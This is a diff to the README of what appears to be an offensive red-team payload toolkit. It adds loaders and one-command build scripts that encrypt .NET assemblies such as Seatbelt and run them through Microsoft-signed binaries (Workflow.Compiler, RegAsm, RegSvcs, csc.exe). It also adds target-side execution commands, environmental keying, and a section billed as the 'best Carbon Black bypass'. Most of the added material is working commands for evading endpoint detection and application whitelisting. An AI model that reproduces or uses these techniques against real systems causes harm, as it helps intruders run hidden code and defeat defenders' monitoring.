@@ -42,6 +42,10 @@ All C++ loaders support both EXE and DLL invocation via compile-time `targetType
 | `msbuild_payload.csproj` | MSBuild inline task — full chain in XML, executed by Microsoft-signed MSBuild.exe |
 | `msbuild_listener.csproj` | MSBuild named pipe listener — persistent execute-assembly loop |
 | `installutil_payload.cs` | InstallUtil payload — compile with Mono, run via Microsoft-signed InstallUtil.exe |
+| `workflow_payload.cs` | Microsoft.Workflow.Compiler payload — text-only input, no unsigned DLL needed |
+| `regasm_payload.cs` | RegAsm payload — [ComRegisterFunction] entry, compile to DLL |
+| `regsvcs_payload.cs` | RegSvcs payload — ServicedComponent entry, requires strong-named DLL |
+| `csc_payload.cs` | csc.exe payload — standalone C# compiled on-target to EXE |
 | `assembly_loader.cs` | Managed C# loader with named pipe and TCP delivery channels |
 
 ### Tooling
@@ -50,6 +54,10 @@ All C++ loaders support both EXE and DLL invocation via compile-time `targetType
 |------|-------------|
 | `build_msbuild.py` | One-command build: encrypts assembly and injects into MSBuild template |
 | `build_installutil.py` | One-command build: encrypts assembly and injects into InstallUtil template |
+| `build_workflow.py` | One-command build: encrypts assembly and generates workflow compiler files |
+| `build_regasm.py` | One-command build: encrypts assembly and injects into RegAsm template |
+| `build_regsvcs.py` | One-command build: encrypts assembly and injects into RegSvcs template (strong-named) |
+| `build_csc.py` | One-command build: encrypts assembly and injects into csc.exe template |
 | `encrypt_payload.py` | XOR/AES encryptor — outputs C# byte arrays, raw binary, or hex |
 | `pipe_client.py` | Operator-side named pipe client for sending assemblies to the pipe listener |
 
@@ -168,6 +176,58 @@ mcs -target:library -r:System.Configuration.Install -out:payload.dll payload_rea
 
 # On target:
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
+```
+
+### Workflow Compiler (best Carbon Black bypass — text-only, no DLL needed)
+
+```bash
+# One-command build — generates 3 files (.cs, .xoml, input XML)
+python build_workflow.py Seatbelt.exe -- -group=all
+
+# DLL, keying, XOR — all work the same way
+python build_workflow.py MyLib.dll --type Namespace.Class --method Run
+python build_workflow.py Seatbelt.exe --keying hostname=WS01,domain=CORP -- -group=all
+python build_workflow.py Seatbelt.exe -e xor -- -group=all
+
+# Transfer all 3 files to the same directory on target:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe workflow_input_ready.xml out.log
+```
+
+### RegAsm Payload
+
+```bash
+# One-command build
+python build_regasm.py Seatbelt.exe -- -group=all
+
+# Auto-compile to DLL with Mono
+python build_regasm.py Seatbelt.exe --compile -- -group=all
+
+# On target:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U payload.dll
+```
+
+### RegSvcs Payload (requires strong-named DLL)
+
+```bash
+# One-command build with auto strong-naming
+python build_regsvcs.py Seatbelt.exe --compile -- -group=all
+
+# Provide existing keypair
+python build_regsvcs.py Seatbelt.exe --compile --keyfile mykey.snk -- -group=all
+
+# On target:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe payload.dll
+```
+
+### csc.exe Payload (compile on-target)
+
+```bash
+# One-command build
+python build_csc.py Seatbelt.exe -- -group=all
+
+# Transfer .cs to target and compile there:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:payload.exe payload_ready.cs
+payload.exe
 ```
 
 ### Supported Assembly Types
